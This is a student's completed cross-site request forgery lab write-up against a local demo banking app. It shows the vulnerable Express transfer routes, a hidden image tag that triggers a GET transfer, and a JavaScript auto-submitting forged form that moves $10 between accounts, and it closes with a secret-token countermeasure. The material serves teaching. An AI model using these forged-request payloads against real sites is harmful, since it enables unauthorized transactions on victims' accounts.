# Cybersecurity - Cross Site Request Forgery Lab

**1**. Download the zip le attached to this assignment. It has the code that I
wrote during the demo for executing an attack using a GET request.

**2**. Open your terminal and cd into the lab folder.

**3**. Enter `npm install` to install all dev dependencies.

**4**. Enter `npm start` to start server.

**5**. Open your web browser to http://localhost:3000/ for the target site. Login as bob (password is test). Open your web browser to http://localhost:3001/ for the malicious site.

&nbsp; a. Look at the html pages for both. What is the current balance on the
target site?

The current balance on the target site is 500.

![5a](images/lab3/5a)

&nbsp; b. Refresh the malicious page, then refresh the target page. What
happened to the balance? Why?

![5b](images/lab3/5b1)

The balance decreased by 15, as the CSRF attack hidden within the img tag was executed when the page was reloaded:

```html
<img src="http://localhost:3000/transfer?to=alice&amount=15" width="1px" height="1px">
```

The transfer is also visible in npm's logs:

![5b](images/lab3/5b2)

**6**. Look through the other files, particularly server.js. Where is the vulnerability for a CSRF attack?

The vulnerability lies within the GET and POST methods for the '/transfer' route on our backend server:

```javascript

app.get('/transfer', requireLogin, function(req, res, next) {
	transferFunds(
		req.query.to, // alice
		req.session.user.name, // bobby
		req.query.amount, // 10
		function(error) {

			if (error) {
				return res.status(400).send(error.message);
			}

			// Successfully transferred funds.
			// Redirect the user back to the home page.
			res.redirect('/');
		}
	);
})

app.post('/transfer', requireLogin, function(req, res, next) {
	transferFunds(
		req.body.to, // alice
		req.session.user.name, // bobby
		req.body.amount, // 15
		function(error) {

			if (error) {
				return res.status(400).send(error.message);
			}

			// Successfully transferred funds.
			// Redirect the user back to the home page.
			res.redirect('/');
		}
	);
})

```

As you can see, there is no validation method for post or get requests coming through this route beyond session cookies. Therefore, there is no way to validate whether these requests come from a trusted source like our website our from an attacker.
We cannot differentiate between Same-site requests and Cross-site requests.

**7**. In the *evil-examples.html* file, comment out or remove the malicious img tag and malicious link.

```html
<!-- <img src="http://localhost:3000/transfer?to=alice&amount=15" width="1px" height="1px"> -->
```

**8**. Using JavaScript, conduct a CSRF attack via the evil-examples.html file. You should steal $10 from bob’s account and put it in Alice’s account. Enter your malicious JavaScript inside the <script></script> tags. Refer back to the lecture on CSRF as a reference on how to write your code to execute the attack.

I used the following code to execute the attack:

```html
	<script type="text/javaScript">

        function forge_post () {
            var fields;
            fields += "<input type='hidden' name='to' value='alice'>";
            fields += "<input type='hidden' name='amount' value='10'>";
            var p = document.createElement("form");
            p.action = "http://localhost:3000/transfer"
            p.innerHTML = fields;
            p.method = "post";
            document.body.appendChild(p);
            p.submit()
        }

        window.onload = function () { forge_post(); }

	</script>
```
<!-- TODO: add images -->

**9** Briefly explain one countermeasure you could implement in the web browser to prevent a CSRF. You don’t need to implement the countermeasure.

A countermeasure you could implements to prevent a CSRF is a secret token. This token, which would be unique to each user, would be embedded only in the form found in the fund transfer page, and would be expected by the transfer route on the backend. If absent or invalid, the request would be rejected. 
Since this token is only accessible through our website and not stored locally by the user like a cookie, an attacker would not be able to forward it along with their malicious request, effectively preventing the attack.

**10**Submit your answers and updated program as a zip file.

